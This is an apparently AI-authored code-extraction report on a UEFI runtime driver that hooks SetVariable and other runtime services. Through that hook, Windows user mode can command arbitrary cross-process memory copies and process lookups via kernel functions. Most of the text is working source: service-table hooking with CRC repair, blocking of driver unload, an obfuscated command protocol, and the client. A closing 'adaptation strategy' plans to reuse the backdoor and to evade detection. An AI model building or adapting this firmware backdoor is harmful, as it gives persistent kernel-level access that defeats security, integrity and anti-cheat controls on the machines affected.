# EFI_Driver_Access - Runtime Services Communication Patterns

## Overview
This codebase demonstrates UEFI runtime services access from Windows OS through hooked SetVariable calls. The technique persists after ExitBootServices by hooking UEFI runtime tables accessible from the OS.

---

## 1. UEFI RUNTIME ACCESS FROM OS

### 1.1 SetVariable Hook as Communication Channel
**Pattern**: Hook `RT->SetVariable` to intercept calls from Windows via `NtSetSystemEnvironmentValueEx`

**Source**: `CRZEFI/main.c:159-202`
```c
// Hooked EFI function SetVariable()
// Can be called from Windows with NtSetSystemEnvironmentValueEx
EFI_STATUS EFIAPI HookedSetVariable(
    IN CHAR16 *VariableName,
    IN EFI_GUID *VendorGuid,
    IN UINT32 Attributes,
    IN UINTN DataSize,
    IN VOID *Data)
{
    // Use our hook only after we are in virtual address-space
    if (Virtual && Runtime) {
        // Check if variable name is same as our declared one
        if (StrnCmp(VariableName, VARIABLE_NAME,
            (sizeof(VARIABLE_NAME) / sizeof(CHAR16)) - 1) == 0) {
            if (DataSize == sizeof(MemoryCommand)) {
                // We did it! Now we can call the magic function
                return RunCommand((MemoryCommand*)Data);
            }
        }
    }
    // Call the original SetVariable() function
    return oSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}
```
**Key Points**:
- Only active after `Virtual && Runtime` flags set (post-boot)
- Uses specific variable name (`VARIABLE_NAME = L"keRdjvbgC"`) as gate
- Data structure is `MemoryCommand` struct (magic + operation + data[10])
- Falls back to original `oSetVariable` for legitimate calls

---

### 1.2 Runtime Services Pointer Hooking
**Pattern**: Hook UEFI Runtime Services table pointers before OS transition

**Source**: `CRZEFI/main.c:379-396`
```c
// Hook SetVariable (should not fail)
oSetVariable = (EFI_SET_VARIABLE)SetServicePointer(&RT->Hdr,
    (VOID**)&RT->SetVariable, (VOID**)&HookedSetVariable);

// Hook all the other runtime services functions
oGetTime = (EFI_GET_TIME)SetServicePointer(&RT->Hdr,
    (VOID**)&RT->GetTime, (VOID**)&HookedGetTime);
oSetTime = (EFI_SET_TIME)SetServicePointer(&RT->Hdr,
    (VOID**)&RT->SetTime, (VOID**)&HookedSetTime);
// ... (more runtime services hooks)
```

**Source**: `CRZEFI/main.c:265-299`
```c
// Replaces service table pointer with desired one
VOID* SetServicePointer(
    IN OUT EFI_TABLE_HEADER *ServiceTableHeader,
    IN OUT VOID **ServiceTableFunction,
    IN VOID *NewFunction)
{
    // Raise task priority level
    CONST EFI_TPL Tpl = BS->RaiseTPL(TPL_HIGH_LEVEL);

    // Swap the pointers
    VOID* OriginalFunction = *ServiceTableFunction;
    *ServiceTableFunction = NewFunction;

    // Change the table CRC32 signature
    ServiceTableHeader->CRC32 = 0;
    BS->CalculateCrc32((UINT8*)ServiceTableHeader,
        ServiceTableHeader->HeaderSize, &ServiceTableHeader->CRC32);

    // Restore task priority level
    BS->RestoreTPL(Tpl);

    return OriginalFunction;
}
```
**Key Points**:
- Raise TPL to prevent race conditions during swap
- Recalculate CRC32 signature after modifying table (critical for UEFI validation)
- Store original function pointers for chaining

---

### 1.3 Virtual Address Translation Event
**Pattern**: Use `SetVirtualAddressMap` event to convert physical → virtual addresses

**Source**: `CRZEFI/main.c:204-239`
```c
VOID EFIAPI SetVirtualAddressMapEvent(
    IN EFI_EVENT Event,
    IN VOID* Context)
{
    // Convert orignal SetVariable address
    RT->ConvertPointer(0, (VOID**)&oSetVariable);

    // Convert all other addresses
    RT->ConvertPointer(0, (VOID**)&oGetTime);
    RT->ConvertPointer(0, (VOID**)&oSetTime);
    // ... (convert all stored function pointers)

    // Convert runtime services pointer
    RtLibEnableVirtualMappings();

    // Null and close the event so it does not get called again
    NotifyEvent = NULL;

    // We are now working in virtual address-space
    Virtual = TRUE;
}
```

**Source**: `CRZEFI/main.c:349-362`
```c
// Create global event for VirtualAddressMap
status = BS->CreateEventEx(EVT_NOTIFY_SIGNAL,
                            TPL_NOTIFY,
                            SetVirtualAddressMapEvent,
                            NULL,
                            &VirtualGuid,  // gEfiEventVirtualAddressChangeGuid
                            &NotifyEvent);
```
**Key Points**:
- OS calls `SetVirtualAddressMap` during boot transition
- All stored function pointers MUST be converted to virtual addresses
- Event uses GUID: `{13FA7698-C831-49C7-87EA-8F43FCC25196}`
- After conversion, set `Virtual = TRUE` flag

---

### 1.4 ExitBootServices Event
**Pattern**: Track OS boot transition to enable runtime communication

**Source**: `CRZEFI/main.c:241-263`
```c
VOID EFIAPI ExitBootServicesEvent(
    IN EFI_EVENT Event,
    IN VOID* Context)
{
    // This event is called only once so close it
    BS->CloseEvent(ExitEvent);
    ExitEvent = NULL;

    // Boot services are now not avaible
    BS = NULL;

    // We are booting the OS now
    Runtime = TRUE;

    // Print some text so we know it works
    ST->ConOut->SetAttribute(ST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLUE);
    ST->ConOut->ClearScreen(ST->ConOut);
    Print(L"Driver seems to be working as expected! Windows is booting now...\n");
}
```

**Source**: `CRZEFI/main.c:364-377`
```c
// Create global event for ExitBootServices
status = BS->CreateEventEx(EVT_NOTIFY_SIGNAL,
                            TPL_NOTIFY,
                            ExitBootServicesEvent,
                            NULL,
                            &ExitGuid,  // gEfiEventExitBootServicesGuid
                            &ExitEvent);
```
**Key Points**:
- Event GUID: `{27ABF055-B1B8-4C26-8048-748F37BAA2DF}`
- After this event, Boot Services are INVALID (`BS = NULL`)
- Set `Runtime = TRUE` flag to enable communication
- Only Runtime Services remain accessible

---

### 1.5 Driver Persistence
**Pattern**: Prevent driver unload and maintain runtime presence

**Source**: `CRZEFI/main.c:301-310`
```c
// EFI driver unload routine
static EFI_STATUS EFI_FUNCTION efi_unload(IN EFI_HANDLE ImageHandle)
{
    // We don't want our driver to be unloaded until complete reboot
    return EFI_ACCESS_DENIED;
}
```

**Source**: `CRZEFI/main.c:332-347`
```c
// Install our protocol interface
// This is needed to keep our driver loaded
DummyProtocalData dummy = { 0 };
status = LibInstallProtocolInterfaces(
    &ImageHandle, &ProtocolGuid,
    &dummy, NULL);

// Set our image unload routine
LoadedImage->Unload = (EFI_IMAGE_UNLOAD)efi_unload;
```
**Key Points**:
- Install dummy protocol to prevent automatic cleanup
- Unload function returns `EFI_ACCESS_DENIED` to block unload
- Custom protocol GUID: `{2f84893e-fd5e-2038-8d9e-20a7af9c32f1}`

---

## 2. DRIVER-UEFI COMMUNICATION FROM WINDOWS

### 2.1 NtSetSystemEnvironmentValueEx Interface
**Pattern**: Use Windows NT syscall to invoke UEFI runtime services

**Source**: `EFIClient/Driver.h:38-47`
```c
NTSYSCALLAPI NTSTATUS NTAPI NtSetSystemEnvironmentValueEx(
    _In_ PUNICODE_STRING VariableName,
    _In_ LPGUID VendorGuid,
    _In_reads_bytes_opt_(ValueLength) PVOID Value,
    _In_ ULONG ValueLength,
    _In_ ULONG Attributes
);
```

**Source**: `EFIClient/Driver.cpp:25-34`
```c
void Driver::SendCommand(MemoryCommand* cmd)
{
    UNICODE_STRING VariableName = RTL_CONSTANT_STRING(VARIABLE_NAME);
    NtSetSystemEnvironmentValueEx(
        &VariableName,
        &DummyGuid,
        cmd,
        sizeof(MemoryCommand),
        ATTRIBUTES);
}
```
**Key Points**:
- `NtSetSystemEnvironmentValueEx` maps to UEFI `SetVariable` runtime service
- Variable name must match UEFI hook's expected name (`L"keRdjvbgC"`)
- Attributes: `EFI_VARIABLE_NON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS`
- Command struct passed as variable data payload

---

### 2.2 Privilege Escalation Requirement
**Pattern**: Require `SeSystemEnvironmentPrivilege` to call runtime services

**Source**: `EFIClient/Driver.cpp:8-23`
```c
NTSTATUS SetSystemEnvironmentPrivilege(BOOLEAN Enable, PBOOLEAN WasEnabled)
{
    if (WasEnabled != nullptr)
        *WasEnabled = FALSE;

    BOOLEAN SeSystemEnvironmentWasEnabled;
    const NTSTATUS Status = RtlAdjustPrivilege(
        SE_SYSTEM_ENVIRONMENT_PRIVILEGE,  // Value: 22L
        Enable,
        FALSE,
        &SeSystemEnvironmentWasEnabled);

    if (NT_SUCCESS(Status) && WasEnabled != nullptr)
        *WasEnabled = SeSystemEnvironmentWasEnabled;

    return Status;
}
```

**Source**: `EFIClient/Driver.cpp:172-180`
```c
bool Driver::initialize() {
    currentProcessId = GetCurrentProcessId();
    BOOLEAN SeSystemEnvironmentWasEnabled;

    NTSTATUS status = SetSystemEnvironmentPrivilege(true, &SeSystemEnvironmentWasEnabled);

    if (!NT_SUCCESS(status)) {
        return false;
    }
    // ... (continue initialization)
}
```
**Key Points**:
- Must enable `SE_SYSTEM_ENVIRONMENT_PRIVILEGE` (value 22) before calling
- Requires admin rights to acquire this privilege
- Check stored in `WasEnabled` for restoration later

---

### 2.3 Command Structure Protocol
**Pattern**: Magic-verified command protocol with operation codes

**Source**: `CRZEFI/main.c:24-29`
```c
typedef struct _MemoryCommand {
    int magic;
    int operation;
    ptr64 data[10];
} MemoryCommand;

#define baseOperation 0x6256
#define COMMAND_MAGIC baseOperation*0x7346
```

**Source**: `CRZEFI/main.c:75-83`
```c
EFI_STATUS RunCommand(MemoryCommand* cmd)
{
    // Check if the command has right magic
    if (cmd->magic != COMMAND_MAGIC) {
        return EFI_ACCESS_DENIED;
    }

    // Copy operation
    if (cmd->operation == baseOperation * 0x823) {
        // ... handle copy
    }
}
```

**Operations**:
- `baseOperation * 0x823` (0x31E7156): Copy memory between processes
- `baseOperation * 0x612` (0x24FA5CC): Initialize kernel function pointers
- `baseOperation * 0x289` (0xFD36E6): Get process base address

**Key Points**:
- Magic value validation: `COMMAND_MAGIC = 0x2CF62D4C`
- Operation codes multiplied by `baseOperation` for obfuscation
- Data array holds up to 10 QWORD parameters

---

### 2.4 Kernel Function Resolution
**Pattern**: Resolve ntoskrnl.exe exports from usermode, pass to UEFI driver

**Source**: `EFIClient/Driver.cpp:183-206`
```c
BYTE nstosname[] = { 'n','t','o','s','k','r','n','l','.','e','x','e',0 };
uintptr_t kernelModuleAddress = GetKernelModuleAddress((char*)nstosname);
memset(nstosname, 0, sizeof(nstosname));

BYTE pbid[] = { 'P','s','L','o','o','k','u','p','P','r','o','c','e','s','s', ... };
BYTE gba[] = { 'P','s','G','e','t','P','r','o','c','e','s','s', ... };
BYTE mmcp[] = { 'M','m','C','o','p','y','V','i','r','t','u','a','l', ... };

uintptr_t kernel_PsLookupProcessByProcessId =
    GetKernelModuleExport(kernelModuleAddress, (char*)pbid);
uintptr_t kernel_PsGetProcessSectionBaseAddress =
    GetKernelModuleExport(kernelModuleAddress, (char*)gba);
uintptr_t kernel_MmCopyVirtualMemory =
    GetKernelModuleExport(kernelModuleAddress, (char*)mmcp);

// Send addresses to UEFI driver
MemoryCommand cmd = MemoryCommand();
cmd.operation = baseOperation * 0x612;
cmd.magic = COMMAND_MAGIC;
cmd.data[0] = kernel_PsLookupProcessByProcessId;
cmd.data[1] = kernel_PsGetProcessSectionBaseAddress;
cmd.data[2] = kernel_MmCopyVirtualMemory;
cmd.data[3] = (uintptr_t)&result;
SendCommand(&cmd);
```

**Source**: `CRZEFI/main.c:125-133`
```c
if (cmd->operation == baseOperation * 0x612) {
    GetProcessByPid = (PsLookupProcessByProcessId)cmd->data[0];
    GetBaseAddress = (PsGetProcessSectionBaseAddress)cmd->data[1];
    MCopyVirtualMemory = (MmCopyVirtualMemory)cmd->data[2];
    ptr64 resultAddr = cmd->data[3];
    *(ptr64*)resultAddr = 1;
    return EFI_SUCCESS;
}
```
**Key Points**:
- Usermode resolves kernel function addresses via `NtQuerySystemInformation`
- String obfuscation using byte arrays (zeroed after use)
- UEFI driver stores function pointers globally for later use
- Functions used: `PsLookupProcessByProcessId`, `PsGetProcessSectionBaseAddress`, `MmCopyVirtualMemory`

---

### 2.5 Memory Operations from UEFI Context
**Pattern**: Call kernel functions from UEFI runtime context

**Source**: `CRZEFI/main.c:85-123`
```c
// Copy operation
if (cmd->operation == baseOperation * 0x823) {
    void* src_process_id = (void*)cmd->data[0];
    void* src_address = (void*)cmd->data[1];
    void* dest_process_id = (void*)cmd->data[2];
    void* dest_address = (void*)cmd->data[3];
    ptr64 size = cmd->data[4];
    void* resultAddr = (void*)cmd->data[5];

    if (src_process_id == (void*)4ULL){
        // Same as memcpy function
        CopyMem(dest_address, src_address, size);
    }
    else{
        void* SrcProc = 0;
        void* DstProc = 0;
        ptr64 size_out = 0;
        int status = 0;

        status = GetProcessByPid(src_process_id, &SrcProc);
        if (status < 0){
            *(ptr64*)resultAddr = status;
            return EFI_SUCCESS;
        }

        status = GetProcessByPid(dest_process_id, &DstProc);
        if (status < 0){
            *(ptr64*)resultAddr = status;
            return EFI_SUCCESS;
        }

        *(ptr64*)resultAddr = MCopyVirtualMemory(SrcProc, src_address,
            DstProc, dest_address, size, 1, &size_out);

        //NOTE: dereference SrcProc and DstProc or will be a big leak
    }
    return EFI_SUCCESS;
}
```
**Key Points**:
- Special PID `4` triggers direct `CopyMem` (System process / physical copy)
- Otherwise, resolve EPROCESS via `PsLookupProcessByProcessId`
- Call `MmCopyVirtualMemory` to perform kernel-mode memory copy
- **WARNING**: Code leaks EPROCESS reference count (not dereferenced)

---

### 2.6 Process Base Address Query
**Pattern**: Get process ImageBase via kernel functions

**Source**: `CRZEFI/main.c:135-153`
```c
//Get Process Base Address
if (cmd->operation == baseOperation * 0x289) {
    void* pid = (void*)cmd->data[0];
    void* resultAddr = (void*)cmd->data[1];
    void* ProcessPtr = 0;

    //Find process by ID
    if (GetProcessByPid(pid, &ProcessPtr) < 0 || ProcessPtr == 0) {
        *(ptr64*)resultAddr = 0; // Process not found
        return EFI_SUCCESS;
    }

    //Find process Base Address
    *(ptr64*)resultAddr = (ptr64)GetBaseAddress(ProcessPtr);

    //NOTE: dereference ProcessPtr or will be a big leak
    return EFI_SUCCESS;
}
```

**Source**: `EFIClient/Driver.cpp:37-46`
```c
uintptr_t Driver::GetBaseAddress(uintptr_t pid) {
    uintptr_t result = 0;
    MemoryCommand cmd = MemoryCommand();
    cmd.operation = baseOperation * 0x289;
    cmd.magic = COMMAND_MAGIC;
    cmd.data[0] = pid;
    cmd.data[1] = (uintptr_t)&result;
    SendCommand(&cmd);
    return result;
}
```
**Key Points**:
- Uses `PsLookupProcessByProcessId` to get EPROCESS
- Calls `PsGetProcessSectionBaseAddress(EPROCESS)` to get ImageBase
- Returns value written to usermode address
- **WARNING**: EPROCESS reference leak (not dereferenced)

---

## IMPLEMENTATION NOTES FOR OMBRA

### Critical Takeaways
1. **Runtime Services Persistence**: UEFI runtime services remain accessible after OS boot
2. **SetVariable as IPC**: `NtSetSystemEnvironmentValueEx` provides kernel-mode communication channel
3. **Virtual Address Translation**: Must convert ALL function pointers during `SetVirtualAddressMap`
4. **TPL Management**: Raise TPL before modifying UEFI tables to prevent race conditions
5. **CRC32 Validation**: Recalculate table CRC32 after hooking or firmware may reject it

### Risks
- **Reference Count Leaks**: Code doesn't dereference EPROCESS objects (causes kernel object leak)
- **No Signature Validation**: Relies on magic value only (weak authentication)
- **Privilege Requirement**: Needs `SeSystemEnvironmentPrivilege` (admin-equivalent)
- **Detection Surface**: `NtSetSystemEnvironmentValueEx` calls may be logged/monitored

### Ombra Adaptation Strategy
- Use similar `SetVariable` hook for OmbraPayload → OmbraBoot communication post-launch
- Store kernel function pointers during UEFI phase for later runtime use
- Implement proper EPROCESS dereferencing to avoid detection via leaked handles
- Add additional validation beyond magic value (HMAC or nonce-based challenge)
- Consider hooking multiple runtime services for redundancy

---

**Extraction Date**: 2025-12-20
**Source**: EFI_Driver_Access (TheCruZ/Samuel Tulach)
**Analyzed By**: ENI (Hypervisor Research Agent)
